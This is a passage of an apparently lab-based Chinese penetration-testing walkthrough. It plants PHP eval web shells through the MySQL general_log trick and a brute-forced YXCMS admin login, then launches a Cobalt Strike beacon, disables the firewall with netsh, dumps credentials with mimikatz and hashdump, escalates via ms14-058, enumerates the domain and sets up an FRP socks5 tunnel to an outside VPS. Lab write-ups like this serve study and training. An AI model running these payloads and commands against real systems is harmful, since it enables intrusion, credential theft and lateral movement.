+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.21.04.png" alt="截屏2022-05-22 04.21.04"></p>
+<h3 id="MySQL日志写入木马"><a href="#MySQL日志写入木马" class="headerlink" title="MySQL日志写入木马"></a>MySQL日志写入木马</h3><p>通过弱口令<code>root/root</code>可成功登录 PHPMyAdmin 的后台<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.25.04.png" alt="截屏2022-05-22 04.25.04"></p>
+<p>执行SQL语句查看是否存在写入权限，<code>secure_file_priv</code>显示为 NULL</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.26.35.png" alt="截屏2022-05-22 04.26.35"></p>
+<p>如果我们通过<code>into outfile</code>来写入木马，那么由于<code>secure_file_priv</code>的限制会导致这种方案并不可行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/www/mac.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.36.24.png" alt="截屏2022-05-22 04.36.24"></p>
+<p>因此我们需要通过日志来写入木马，尝试开启日志记录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> &quot;ON&quot;;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.38.45.png" alt="截屏2022-05-22 04.38.45"></p>
+<p>查看日志记录文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;general%&quot;;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.39.55.png" alt="截屏2022-05-22 04.39.55"></p>
+<p>修改日志记录文件为木马文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span>&quot;C:/phpStudy/www/mac.php&quot;;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.44.13.png" alt="截屏2022-05-22 04.44.13"></p>
+<p>写入木马至指定日志记录文件当中</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;mac&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.46.17.png" alt="截屏2022-05-22 04.46.17"></p>
+<p>成功通过蚁剑连接木马文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.47.54.png" alt="截屏2022-05-22 04.47.54"></p>
+<h3 id="YXCMS后台上传木马"><a href="#YXCMS后台上传木马" class="headerlink" title="YXCMS后台上传木马"></a>YXCMS后台上传木马</h3><p>在源码中解压后发现<code>yxcms</code>目录并尝试访问，访问后发现页面为 YXCMS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.53.22.png" alt="截屏2022-05-22 04.53.22"></p>
+<p>由于 YXCMS 的默认后台为<code>index.php?r=admin</code>，我们尝试访问该后台地址<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.55.46.png" alt="截屏2022-05-22 04.55.46"></p>
+<p>使用 BurpSuite 截取数据包，复用验证码尝试爆破密码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2004.59.29.png" alt="截屏2022-05-22 04.59.29"></p>
+<p>成功爆破出 admin 密码为 123456，使用该账户密码成功登录后台</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.03.25.png" alt="截屏2022-05-22 05.03.25"></p>
+<p>选择前台模版并在<code>index_index.php</code>插入木马</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.07.10.png" alt="截屏2022-05-22 05.07.10"></p>
+<p>保存成功后使用蚁剑连接木马文件</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.09.03.png" alt="截屏2022-05-22 05.09.03"></p>
+<h2 id="0x03-内网信息探测"><a href="#0x03-内网信息探测" class="headerlink" title="0x03 内网信息探测"></a>0x03 内网信息探测</h2><h3 id="CS上线VPS服务器"><a href="#CS上线VPS服务器" class="headerlink" title="CS上线VPS服务器"></a>CS上线VPS服务器</h3><p>在蚁剑中执行命令发现当前用户为域管理员，那么可以省去提权过程并直接上线CS</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.17.59.png" alt="截屏2022-05-22 05.17.59"></p>
+<p>在CS中开启 http 监听器并生成利用程序<code>mac1.exe</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.26.08.png" alt="截屏2022-05-22 05.26.08"></p>
+<p>上传木马后并在命令行中直接执行<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.28.14.png" alt="截屏2022-05-22 05.28.14"></p>
+<p>成功上线CS<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.29.18.png" alt="截屏2022-05-22 05.29.18"></p>
+<h3 id="本机基础环境信息收集"><a href="#本机基础环境信息收集" class="headerlink" title="本机基础环境信息收集"></a>本机基础环境信息收集</h3><p>减少回连时间为3秒并查看网络连接情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep 3</span><br><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.45.37.png" alt="截屏2022-05-22 05.45.37"></p>
+<p>如果有需要的话可以关闭防火墙</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode=disable</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>成功发现目标存在两个网段，说明内网网段中可能存在其他主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.0/24 </span><br><span class="line">192.168.52.0/24</span><br></pre></td></tr></table></figure>
+
+<p>运行 mimikatz 成功获得管理员密码为<code>Mac123456</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.45.04.png" alt="截屏2022-05-22 05.45.04"></p>
+<p>成功获取用户哈希值</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.47.57.png" alt="截屏2022-05-22 05.47.57"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>借助梼杌插件通过 ms14-058 可直接将权限提升至 SYSTEM<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.55.05.png" alt="截屏2022-05-22 05.55.05"></p>
+<p>成功上线 SYSTEM 系统管理员<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2005.55.57.png" alt="截屏2022-05-22 05.55.57"></p>
+<h3 id="内网域环境信息收集"><a href="#内网域环境信息收集" class="headerlink" title="内网域环境信息收集"></a>内网域环境信息收集</h3><p>内网信息收集的目的是查找域控以及其他域内主机，以下为常见的内网信息收集命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></table></figure>
+
+<p>首先我们需要判断当前域名是什么？判断的方式有许多种，以下为常用的几种方式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig /all</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2006.03.54.png" alt="截屏2022-05-22 06.03.54"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net config workstation</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2006.04.51.png" alt="截屏2022-05-22 06.04.51"></p>
+<p>成功探测到当前域名为<code>god.org</code>，接下来需要探索目标存在多少域</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net view /domain</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2006.06.59.png" alt="截屏2022-05-22 06.06.59"></p>
+<p>结果显示目标只存在<code>GOD</code>域，而<code>WORKGROUP</code>只是工作组而已。然后尝试寻找域控主机名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.02.00.png" alt="截屏2022-05-22 15.02.00"></p>
+<blockquote>
+<p>结果显示报错<code>RPC 服务器不可用</code>，这是什么原因造成的呢？</p>
+</blockquote>
+<p>原来是目标无法完成域名解析，因此我们可以在外网网卡中设置 DNS 服务器为域控</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8B%E5%8D%883.07.10.png" alt="截屏2022-05-22 下午3.07.10"></p>
+<p>再次寻找域控并确认域控主机名为<code>OWA</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.34.04.png" alt="截屏2022-05-22 15.34.04"></p>
+<p>有了域控主机名以后我们尝试寻找其他域内主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.36.44.png" alt="截屏2022-05-22 15.36.44"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%2015.38.27.png" alt="截屏2022-05-22 15.38.27"></p>
+<p>至此内网信息搜集完毕，域内主机的分布如下，我们需要进一步完成横向渗透</p>
+<table>
+<thead>
+<tr>
+<th>主机名</th>
+<th>IP地址</th>
+<th>是否为域控</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OWA</td>
+<td>192.168.52.138</td>
+<td>是</td>
+</tr>
+<tr>
+<td>ROOT-TVI862UBEH</td>
+<td>192.168.52.141</td>
+<td>否</td>
+</tr>
+<tr>
+<td>STU1</td>
+<td>192.168.52.143</td>
+<td>否</td>
+</tr>
+</tbody></table>
+<h2 id="0x04-内网横向渗透"><a href="#0x04-内网横向渗透" class="headerlink" title="0x04 内网横向渗透"></a>0x04 内网横向渗透</h2><h3 id="建立FRP代理隧道"><a href="#建立FRP代理隧道" class="headerlink" title="建立FRP代理隧道"></a>建立FRP代理隧道</h3><p>为了更好地模拟真实环境，我们可以通过在 VPS 服务器上搭建 FRP 隧道访问目标内网。</p>
+<h4 id="FRP配置"><a href="#FRP配置" class="headerlink" title="FRP配置"></a>FRP配置</h4><p><code>frps.ini</code>配置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = macmacmac12345678</span><br></pre></td></tr></table></figure>
+
+<p><code>frpc.ini</code>配置：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=x.x.x.x</span><br><span class="line">server_port = 7000</span><br><span class="line">token = macmacmac12345678</span><br><span class="line">[http_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+<h4 id="FRP连接"><a href="#FRP连接" class="headerlink" title="FRP连接"></a>FRP连接</h4><p>在 VPS 服务器上启动 FRP</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/50c969ee/%E6%88%AA%E5%B1%8F2022-05-22%20%E4%B8%8B%E5%8D%885.04.08.png" alt="截屏2022-05-22 下午5.04.08"></p>
